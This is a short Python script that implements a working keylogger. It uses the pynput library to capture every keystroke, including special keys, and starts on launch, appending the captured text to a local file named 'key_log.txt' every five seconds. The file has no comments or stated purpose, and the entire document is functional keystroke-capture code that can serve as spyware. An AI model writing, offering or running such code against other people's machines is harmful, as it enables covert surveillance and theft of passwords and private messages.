import pynput.keyboard
import threading

class Keylogger:
    def __init__(self, time, file_path):
        self.stored_keys = ""
        self.time = time
        self.file_path = file_path
        self.lock = threading.Lock()

    def log(self, string):
        with self.lock:
            self.stored_keys += string

    def key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = ' '
            else:
                current_key = f' [{str(key)}] '
        self.log(current_key)

    def save(self):
        with self.lock:
            if self.stored_keys:
                with open(self.file_path, 'a') as file:
                    file.write(self.stored_keys + '\n')
                self.stored_keys = ""
        timer = threading.Timer(self.time, self.save)
        timer.start()

    def start(self):
        with pynput.keyboard.Listener(on_press=self.key_press) as listener:
            self.save()
            listener.join()

file_path = "key_log.txt"
key_logger = Keylogger(5, file_path)
key_logger.start()
